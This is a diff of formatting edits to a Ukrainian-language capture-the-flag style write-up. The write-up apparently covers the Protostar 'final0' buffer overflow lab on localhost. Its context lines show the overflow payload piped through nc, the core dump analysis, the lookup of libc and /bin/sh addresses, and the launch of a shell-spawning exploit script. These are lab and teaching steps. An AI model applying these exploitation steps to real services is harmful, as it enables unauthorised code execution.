@@ -66,7 +66,7 @@ int main(int argc, char **argv, char **envp)
 ```nc 127.0.0.1 2995```  
  
 Передамо у програму замість username дані, які викличуть переповнення буфера:  
-python -c "print('a' * 510 + '\x00' + 'aaaabbbbccccddddeeeeffffgggg')" | nc 127.0.0.1 2995
+```python -c "print('a' * 510 + '\x00' + 'aaaabbbbccccddddeeeeffffgggg')" | nc 127.0.0.1 2995```
 
 Після цього у директорії /tmp/ має згенеруватися дамп ядра. Завантажимо його та перевіримо стан регістрів:  
 ```
@@ -77,7 +77,7 @@ x/32wx $esp-8
 ```
 
 Регістр ```EBP``` має значення ```0x66656565``` що відповідає 'eeeef' у реверсі.
-Отже, для перезапису адреси повернення нам необхідно передати програмі 'a' * 510 + '\x00' + 'aaaabbbbccccddddeeeef' (532 байти).
+Отже, для перезапису адреси повернення нам необхідно передати програмі ```'a' * 510 + '\x00' + 'aaaabbbbccccddddeeeef'``` (532 байти).
 
 ```
 python -c "print('a' * 510 + '\x00' + 'aaaabbbbccccddddeeeeffffgggg')" | nc 127.0.0.1 2995
@@ -99,7 +99,7 @@ gdb -p `pidof final0`
 info functions @plt
 # 0x08048c0c
 ```
-![execve](execve.png)
+![execve](img/execve.png)
 
 Отже, маємо ```0x08048c0c```
 
@@ -110,14 +110,14 @@ cat /proc/1425/maps
 # b7e97000 - навпроти /lib/libc-2.11.2.so
 ```
 
-![/lib/libc](lib_libc.png)
+![/lib/libc](img/lib_libc.png)
 
 ```
 grep -R -a -b -o /bin/sh /lib/libc.so.6
 #1176511:/bin/sh
 ```
 
-![/bin/sh](bin_sh.png)
+![/bin/sh](img/bin_sh.png)
 
 Маючи усі необхідні дані можемо писати код експлойту:  
 ```nano exploit.py```  
@@ -154,4 +154,4 @@ t.interact()
 Запускаємо експлойт і все готово:  
 ```python exploit.py```
 
-![Shell test](shell_test.png)
+![Shell test](img/shell_test.png)
